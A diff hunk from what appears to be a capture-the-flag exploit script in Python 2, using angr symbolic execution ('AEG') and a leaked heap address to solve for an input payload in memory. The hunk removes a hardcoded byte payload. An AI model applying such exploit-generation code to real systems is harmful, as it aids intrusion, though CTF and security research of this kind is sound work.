@@ -83,21 +83,22 @@ log.success( 'heap -> %s' % hex( heap ) )
 
 
 print 'AEG'
+
 p = angr.Project( './tmp' , load_options={'auto_load_libs': False} )
+
 state = p.factory.blank_state( addr = int( raw_input('good').strip() , 16 ) )
+
 state.regs.rdi = 0x6020b0
+
 sm = p.factory.simulation_manager( state , immutable = False )
+
 good = int( raw_input('good').strip() , 16 )
 bad = []
+
 sm.explore( find = good , avoid = bad )
 
-
-
-
-
-p = '\x00\x00\x00\x00\xc6\x00\xb7\xc6\x59\x00\x00\x00\x00\x00\x00\x00\x59\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31'
-#p = sm.found[0].solver.eval( sm.found[0].memory.load( 0x6020b0 , 0xc0 ) , cast_to = str )
 p = sm.found[0].solver.eval( sm.found[0].memory.load( 0x6020b0 , 0x40 ) , cast_to = str )
+
 
 
 print hex(len(p))
